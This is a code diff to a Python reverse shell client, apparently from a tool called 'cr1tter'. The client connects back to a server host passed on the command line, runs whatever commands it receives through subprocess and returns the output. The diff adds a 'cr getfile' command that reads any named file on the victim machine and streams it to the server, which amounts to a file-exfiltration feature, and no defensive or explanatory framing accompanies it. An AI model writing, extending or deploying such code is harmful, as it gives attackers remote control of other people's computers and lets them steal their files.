@@ -2,12 +2,25 @@ import socket
 import os
 import subprocess
 import sys
+import tqdm
 
-SERVER_HOST = "127.0.0.1" #sys.argv[1]
+SERVER_HOST = sys.argv[1]
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
+
+def cr_SendFile(filename: str):
+    filesize = os.path.getsize(filename)
+    progress = tqdm.tqdm(range(filesize), desc=f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    s.send(f"{filename}{SEPARATOR}{filesize}".encode())
+    with open(filename, "rb") as f:
+        while True:
+            bytes_read = f.read(BUFFER_SIZE)
+            if not bytes_read:
+                break
+            s.sendall(bytes_read)
+            progress.update(len(bytes_read))
 
 
 s = socket.socket()
@@ -23,7 +36,7 @@ while True:
     if command.lower() == "exit":
         # if the command is exit, just break out of the loop
         break
-    if splited_command[0].lower() == "cd":
+    elif splited_command[0].lower() == "cd":
         # cd command, change directory
         try:
             os.chdir(' '.join(splited_command[1:]))
@@ -33,13 +46,24 @@ while True:
         else:
             # if operation is successful, empty message
             output = ""
+    elif splited_command[0].lower() == "cr":
+        # cr1tter command
+
+        if splited_command[1].lower() == "getfile":
+            try:
+                cr_SendFile(splited_command[2])
+            except FileNotFoundError as e:
+                output = str(e)
+            else:
+                output = ""
+
     else:
         # execute the command and retrieve the results
         output = subprocess.getoutput(command)
-    # get the current working directory as output
-    cwd = os.getcwd()
-    # send the results back to the server
-    message = f"{output}{SEPARATOR}{cwd}"
-    s.send(message.encode())
-# close client connection
+
+    if splited_command[0] != "cr":
+        cwd = os.getcwd()
+        message = f"{output}{SEPARATOR}{cwd}"
+        s.send(message.encode())
+
 s.close()
